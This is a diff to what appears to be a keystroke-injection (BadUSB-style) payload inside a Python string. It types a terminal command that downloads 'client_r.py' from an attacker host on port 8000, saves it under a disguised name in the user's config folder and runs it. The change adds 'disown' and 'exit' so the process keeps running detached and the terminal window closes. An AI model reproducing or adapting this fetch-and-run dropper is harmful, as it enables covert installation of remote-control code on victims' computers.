@@ -41,7 +41,7 @@ STRING terminal
 DELAY 300
 ENTER
 DELAY 1000
-STRING (wget http://{local_ip}:8000/client_r.py -O $HOME/.config/setup.py && python3 $HOME/.config/setup.py)
+STRING (wget http://{local_ip}:8000/client_r.py -O $HOME/.config/setup.py && python3 $HOME/.config/setup.py) & disown; exit
 ENTER
 """
 
